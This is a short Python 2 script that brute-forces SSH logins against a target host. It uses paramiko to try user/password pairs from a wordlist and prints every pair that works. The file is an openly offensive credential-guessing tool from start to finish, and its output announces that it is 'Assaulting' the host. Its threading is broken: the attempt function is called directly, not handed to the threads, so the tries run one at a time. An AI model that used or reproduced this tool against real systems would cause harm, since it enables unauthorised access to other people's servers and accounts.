#!/usr/bin/env python

import threading
import sys

NUM_THREADS=10

try:
    from paramiko import *
except ImportError:
    print "Paramiko is required for the ssh implementation"
    print "http://www.lag.net/paramiko"
    sys.exit(0)

def brutissh(host, wordlist):
    clnt = SSHClient()
    clnt.load_system_host_keys()

    for user,passwd in wordlist:
        try:
            clnt.connect(host, username=user, password=passwd)
        except AuthenticationException:
            continue
        except BadHostKeyException:
            print "You must add this hostkey first!"
        print "Success:", user, "|", passwd

def load_userpass(fname):
    lines = open(fname).readlines()
    return [tuple(l.split()) for l in lines]

def split_list(uplist, num):
    ln = len(uplist)
    whole,rem = divmod(ln, num)

    if whole == 0:
        return uplist

    rl = []
    for i in range(0, ln - rem, whole):
        rl.append( uplist[i:i+whole] )

    if rem:
        rl.append(uplist[-rem:])
    return rl

def main(argv):
    if len(argv) < 3:
        print "%s <host> <wordlist> [num_threads]" % argv[0]
        sys.exit(1)

    host = argv[1]
    upl = load_userpass(argv[2])

    global NUM_THREADS
    if len(argv) == 4:
        NUM_THREADS = int(argv[3])

    upl = split_list(upl, NUM_THREADS)

    print "Starting up..."
    print "Assaulting: %s with %d user/passes on %d threads" % \
            (host, len(upl), NUM_THREADS)

    threads = []
    for up in upl:
        current = threading.Thread(target=brutissh(host, up))
        current.start()
        threads.append(current)

    for thrd in threads:
        thrd.join()

    print "Finished.."

if __name__ == "__main__":
    main(sys.argv)
